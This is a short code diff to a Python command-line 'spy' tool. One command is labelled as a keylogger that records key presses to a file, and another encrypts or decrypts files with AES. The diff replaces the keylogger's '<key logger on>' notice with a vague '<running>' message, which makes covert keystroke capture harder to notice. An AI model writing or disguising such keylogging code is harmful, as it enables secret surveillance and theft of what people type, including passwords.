@@ -12,7 +12,7 @@ def spy():
 @spy.command(help='Keylogger')
 @click.option('-p', type=click.Path(exists=True), default='.', help='Path to send output file with info')
 def keyboard(p):
-    print('<key logger on> f3 to stop record')
+    print('<running> f3 to stop')
     os.chdir(p)
     listener = Listener(on_press=key_down, on_release=key_up)
     listener.start()
@@ -29,6 +29,7 @@ def keyboard(p):
 def crypt(p, key, dc, ex, cl):
     """\b
     Encrypt/Decrypt files with AES algorithm
+
     \b
     Save the <key> you need her to decode
     The key NEED have 16 characters (128bits)
